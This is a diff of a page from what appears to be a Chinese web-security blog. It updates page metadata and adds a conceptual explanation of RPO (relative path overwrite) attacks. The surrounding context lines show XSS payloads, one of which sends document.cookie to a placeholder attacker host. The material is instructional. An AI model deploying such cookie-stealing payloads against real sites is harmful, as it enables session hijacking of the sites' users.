@@ -402,21 +402,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2023-07-09
+                    2023-07-18
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    2.5k
+                    2.8k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    11 分
+                    12 分
                 </div>
                 
 
@@ -624,6 +624,7 @@ Payload：&lt;details/open/ontoggle=(confirm)()//
 
 &lt;body onload=&quot;window.open(&#39;http://你的公网ip:端口号/&#39;+document.cookie)&quot;&gt;
 </code></pre>
+<h3 id="RPO-攻击"><a href="#RPO-攻击" class="headerlink" title="RPO 攻击"></a>RPO 攻击</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>由于<strong>Apache 服务器对编码后的 url 不能正常解析，而 Nginx 却可以正常解析。</strong><br>（Apache 服务器不能解析%2f 是默认配置问题，可见：链接包含”%2F”导致mod_rewrite失效）<br>假设现在有2个目录分别为aaa目录和bbb目录，利用浏览器与服务器对特殊构造的url的解析差异<br>能够让获取了aaa目录下的文件的浏览器误以为自己在bbb目录。<br>当aaa下的文件出现了相对路径的文件引用的时候，浏览器会去读取bbb目录下的该文件，从而造成了漏洞的产生。<br>目前来看此攻击方法依赖于浏览器和网络服务器的反应<br>基于服务器的Web缓存技术和配置差异，以及服务器和客户端浏览器的解析差异<br>利用前端代码中加载的css/js的相对路径来加载其他文件<br>最终浏览器将服务器返回的不是css/js的文件当做css/js来解析<br>从而导致XSS，信息泄露等漏洞产生。</p>
 
                 
             </div>
@@ -927,7 +928,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">94.9k</span>
+                        class="white-color">97.7k</span>
             
             
             
